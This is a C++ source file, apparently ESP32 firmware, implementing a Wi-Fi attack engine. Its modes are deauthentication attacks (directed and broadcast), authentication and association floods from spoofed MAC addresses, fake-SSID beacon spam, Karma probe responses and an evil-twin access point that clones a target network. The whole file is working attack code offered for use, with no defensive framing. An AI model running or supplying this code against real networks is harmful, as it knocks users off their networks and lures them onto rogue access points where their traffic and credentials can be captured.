#include "attacker.h"
#include "framebuilder.h"
#include "scanner.h"
#include "../log.h"
#include <WiFi.h>

extern "C" {
    int wifi_tx_raw_frame(void* frame, int len);
}

static const uint8_t BCAST[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};

Attacker Attack;

void Attacker::init() {
    _running = false;
    _mode = ATK_NONE;
    memset(&_stats, 0, sizeof(_stats));
}

void Attacker::setFrames(uint8_t f) { _frames = f; }
void Attacker::setDelay(uint8_t d)  { _delay_ms = d; }
void Attacker::setReason(uint16_t r){ _reason = r; }

void Attacker::addTarget(const uint8_t* bssid, const uint8_t* client) {
    if (_targetCount >= MAX_NETWORKS) return;
    AttackTarget& t = _targets[_targetCount++];
    memcpy(t.bssid, bssid, 6);
    if (client) memcpy(t.client, client, 6);
    else memset(t.client, 0, 6);
    t.active = true;
}

void Attacker::clearTargets() { _targetCount = 0; }
int  Attacker::targetCount() const { return _targetCount; }

void Attacker::addBeaconSSID(const char* ssid) {
    if (_beaconCount >= MAX_BEACON_SSIDS) return;
    strlcpy(_beaconSSIDs[_beaconCount++], ssid, 33);
}
void Attacker::clearBeaconSSIDs() { _beaconCount = 0; }
void Attacker::setBeaconChannel(uint8_t ch) { _beaconChannel = ch; }
void Attacker::setBeaconInterval(uint16_t ms) { _beaconInterval = ms; }

void Attacker::setEvilTwinTarget(const uint8_t* bssid, const char* ssid, uint8_t channel) {
    memcpy(_etBSSID, bssid, 6);
    strlcpy(_etSSID, ssid, sizeof(_etSSID));
    _etChannel = channel;
}

void Attacker::startAttack(AttackMode mode) {
    _mode = mode;
    _running = true;
    _targetIdx = 0;
    memset(&_stats, 0, sizeof(_stats));
    _stats.start_time = millis();
    _lastTx = 0;

    if (mode == ATK_EVIL_TWIN) {
        WiFi.softAP(_etSSID, "", _etChannel);
        _etActive = true;
        Log.log(LOG_ATTACK, "Evil twin started: SSID=%s ch=%d", _etSSID, _etChannel);
    } else {
        Log.log(LOG_ATTACK, "Attack started: mode=%d targets=%d", mode, _targetCount);
    }
}

void Attacker::stopAttack() {
    _running = false;
    if (_etActive) {
        WiFi.softAP(nullptr); // stop evil twin; main AP restores in main
        _etActive = false;
    }
    Log.log(LOG_ATTACK, "Attack stopped. D:%u B:%u A:%u",
            _stats.deauths_sent, _stats.beacons_sent, _stats.auth_sent);
    _mode = ATK_NONE;
}

bool Attacker::isRunning() const { return _running; }
AttackMode Attacker::currentMode() const { return _mode; }
const AttackStats& Attacker::stats() const { return _stats; }

bool Attacker::_txFrame(uint8_t* buf, int len) {
    return wifi_tx_raw_frame(buf, len) == 0;
}

void Attacker::tick() {
    if (!_running) return;
    uint32_t now = millis();
    if (now - _lastTx < _delay_ms) return;
    _lastTx = now;

    switch (_mode) {
    case ATK_DEAUTH:
    case ATK_DEAUTH_BCAST: _tickDeauth(); break;
    case ATK_AUTH_FLOOD:   _tickAuthFlood(); break;
    case ATK_ASSOC_FLOOD:  _tickAssocFlood(); break;
    case ATK_BEACON_SPAM:  _tickBeaconSpam(); break;
    case ATK_KARMA:        _tickKarma(); break;
    case ATK_EVIL_TWIN:    /* AP handles passively */ break;
    default: break;
    }
}

void Attacker::_tickDeauth() {
    if (_targetCount == 0) return;
    if (_targetIdx >= _targetCount) _targetIdx = 0;
    AttackTarget& t = _targets[_targetIdx++];

    uint8_t buf[64];
    const uint8_t* da = (_mode == ATK_DEAUTH_BCAST ||
                         memcmp(t.client, "\0\0\0\0\0\0", 6) == 0)
                        ? BCAST : t.client;

    for (uint8_t i = 0; i < _frames; i++) {
        int len = FrameBuilder::buildDeauth(buf, t.bssid, da, _reason);
        if (_txFrame(buf, len)) _stats.deauths_sent++;
        if (_delay_ms > 0) delay(_delay_ms);
    }
    // Also send deauth to AP pretending to be the client (if directed)
    if (_mode == ATK_DEAUTH && memcmp(da, BCAST, 6) != 0) {
        int len = FrameBuilder::buildDeauth(buf, t.bssid, t.bssid, _reason);
        if (_txFrame(buf, len)) _stats.deauths_sent++;
    }
}

void Attacker::_tickAuthFlood() {
    if (_targetCount == 0) return;
    if (_targetIdx >= _targetCount) _targetIdx = 0;
    AttackTarget& t = _targets[_targetIdx++];

    uint8_t buf[64];
    for (uint8_t i = 0; i < _frames; i++) {
        uint8_t spoofed[6];
        FrameBuilder::randomMAC(spoofed);
        int len = FrameBuilder::buildAuth(buf, t.bssid, spoofed);
        if (_txFrame(buf, len)) _stats.auth_sent++;
        if (_delay_ms > 0) delay(_delay_ms);
    }
}

void Attacker::_tickAssocFlood() {
    if (_targetCount == 0) return;
    if (_targetIdx >= _targetCount) _targetIdx = 0;
    AttackTarget& t = _targets[_targetIdx++];

    // Find SSID for this BSSID
    const Network* net = Scan.networkByBSSID(t.bssid);
    const char* ssid = net ? net->ssid : "";

    uint8_t buf[128];
    for (uint8_t i = 0; i < _frames; i++) {
        uint8_t spoofed[6];
        FrameBuilder::randomMAC(spoofed);
        int len = FrameBuilder::buildAssocReq(buf, t.bssid, spoofed, ssid);
        if (_txFrame(buf, len)) _stats.assoc_sent++;
        if (_delay_ms > 0) delay(_delay_ms);
    }
}

void Attacker::_tickBeaconSpam() {
    if (_beaconCount == 0) return;
    uint32_t now = millis();
    if (now - _lastBeacon < _beaconInterval) return;
    _lastBeacon = now;

    if (_beaconIdx >= _beaconCount) _beaconIdx = 0;
    const char* ssid = _beaconSSIDs[_beaconIdx++];

    uint8_t bssid[6];
    FrameBuilder::randomMAC(bssid);

    uint8_t buf[128];
    int len = FrameBuilder::buildBeacon(buf, bssid, ssid, _beaconChannel);
    if (_txFrame(buf, len)) _stats.beacons_sent++;
}

void Attacker::_tickKarma() {
    // Karma mode: sniffer calls karmaRespond() on each probe
}

void Attacker::karmaRespond(const uint8_t* da, const char* ssid) {
    if (!_running || _mode != ATK_KARMA) return;
    uint8_t ourMAC[6];
    WiFi.macAddress(ourMAC);
    uint8_t buf[128];
    int len = FrameBuilder::buildBeacon(buf, ourMAC, ssid, _beaconChannel);
    if (_txFrame(buf, len)) _stats.beacons_sent++;
}
